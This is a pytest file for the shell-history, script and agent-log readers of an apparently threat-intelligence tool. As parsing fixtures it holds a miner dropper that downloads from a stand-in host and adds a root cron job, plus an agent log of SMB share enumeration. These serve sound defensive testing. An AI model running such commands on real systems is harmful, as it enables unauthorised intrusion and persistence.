from interlinear_cti.readers import RawCommand
from interlinear_cti.readers.shell_history import read_bash, read_powershell, read_zsh

T0 = "2023-11-14T22:13:20Z"  # epoch 1700000000


def test_bash_history_with_timestamps():
    # bash stores every line up to the next timestamp as one entry under that timestamp (checked with bash 5.3.15
    # and `history -r`), so "ls" shares the "wget" entry's timestamp.
    text = "#1700000000\nid\n#1700000060\nwget http://x/y\nls\n"
    assert read_bash(text) == [
        RawCommand(line=2, text="id", ts=T0),
        RawCommand(line=4, text="wget http://x/y", ts="2023-11-14T22:14:20Z"),
        RawCommand(line=5, text="ls", ts="2023-11-14T22:14:20Z"),
    ]


def test_bash_history_joins_continuations_and_heredocs():
    text = "echo a \\\n  b\ncat <<EOF > /tmp/x\nline1\nEOF\n\nid\n"
    assert read_bash(text) == [
        RawCommand(line=1, text="echo a b"),
        RawCommand(line=3, text="cat <<EOF > /tmp/x\nline1\nEOF"),
        RawCommand(line=7, text="id"),
    ]


def test_zsh_extended_history():
    text = ": 1700000000:0;cd /tmp\n: 1700000005:0;for i in 1 2\\\ndo echo $i\\\ndone\n"
    assert read_zsh(text) == [
        RawCommand(line=1, text="cd /tmp", ts=T0),
        RawCommand(line=2, text="for i in 1 2\ndo echo $i\ndone", ts="2023-11-14T22:13:25Z"),
    ]


def test_plain_zsh_history_reads_one_entry_per_line():
    assert read_zsh("id\nwhoami\n") == [RawCommand(line=1, text="id"), RawCommand(line=2, text="whoami")]


def test_powershell_history_joins_backtick_continuations():
    # PSReadLine's History.cs saves a newline inside a command as a backtick and a newline. Reading back, it drops
    # exactly one final backtick and keeps everything else, the space before it included.
    text = "Get-Process `\n  | Select-Object Name\nwhoami\n"
    assert read_powershell(text) == [
        RawCommand(line=1, text="Get-Process \n  | Select-Object Name"),
        RawCommand(line=3, text="whoami"),
    ]


from interlinear_cti.readers.script import read_script


def test_script_reader_keeps_comments_and_heredocs():
    text = ("#!/bin/bash\n# drop the miner\ncurl -s http://x/m -o /tmp/m && \\\n  chmod +x /tmp/m\n"
            "cat > /etc/cron.d/m <<'END'\n* * * * * root /tmp/m\nEND\n")
    assert read_script(text) == [
        RawCommand(line=1, text="#!/bin/bash"),
        RawCommand(line=2, text="# drop the miner"),
        RawCommand(line=3, text="curl -s http://x/m -o /tmp/m && chmod +x /tmp/m"),
        RawCommand(line=5, text="cat > /etc/cron.d/m <<'END'\n* * * * * root /tmp/m\nEND"),
    ]


def test_powershell_script_uses_backtick_continuation():
    assert read_script("Invoke-WebRequest `\n -Uri x\n", powershell=True) == [
        RawCommand(line=1, text="Invoke-WebRequest -Uri x")]


from interlinear_cti.readers.agent_log import read_agent_jsonl


def test_roles_map_to_actors_and_timestamps_to_utc():
    text = "\n".join([
        '{"ts": "2026-09-14T03:12:00Z", "role": "assistant", "content": "I will enumerate SMB shares next."}',
        '{"ts": "2026-09-14T05:12:05+02:00", "role": "tool_call", "tool": "terminal", "input": "smbclient -L //10.0.0.5 -N"}',
        '{"ts": "2026-09-14T03:12:09Z", "role": "tool_result", "tool": "terminal", "output": "Sharename Type"}',
        '{"role": "user", "content": "skip the DC"}',
    ])
    commands, warnings = read_agent_jsonl(text)
    assert warnings == []
    assert commands == [
        RawCommand(line=1, text="I will enumerate SMB shares next.", ts="2026-09-14T03:12:00Z", actor="agent_reasoning"),
        RawCommand(line=2, text="smbclient -L //10.0.0.5 -N", ts="2026-09-14T03:12:05Z", actor="agent_tool"),
        RawCommand(line=3, text="Sharename Type", ts="2026-09-14T03:12:09Z", actor="tool_output"),
        RawCommand(line=4, text="skip the DC", ts=None, actor="operator"),
    ]


def test_structured_tool_input_is_serialized_with_the_tool_name():
    commands, _ = read_agent_jsonl('{"role": "tool_call", "tool": "http", "input": {"url": "http://x", "method": "GET"}}')
    assert commands[0].text == 'http: {"method": "GET", "url": "http://x"}'


def test_bad_lines_are_kept_as_unknown_with_warnings():
    text = 'not json\n{"role": "narrator", "content": "x"}\n{"role": "user", "content": "hi", "ts": "yesterday"}'
    commands, warnings = read_agent_jsonl(text)
    assert [c.actor for c in commands] == ["unknown", "unknown", "operator"]
    assert warnings == [
        "line 1: not JSON; kept as an unknown line",
        "line 2: unrecognized role 'narrator'; kept as an unknown line",
        "line 3: unparseable timestamp 'yesterday'",
    ]


def test_deeply_nested_json_does_not_crash():
    commands, warnings = read_agent_jsonl("[" * 100000)
    assert [c.actor for c in commands] == ["unknown"]
    assert warnings == ["line 1: not JSON; kept as an unknown line"]
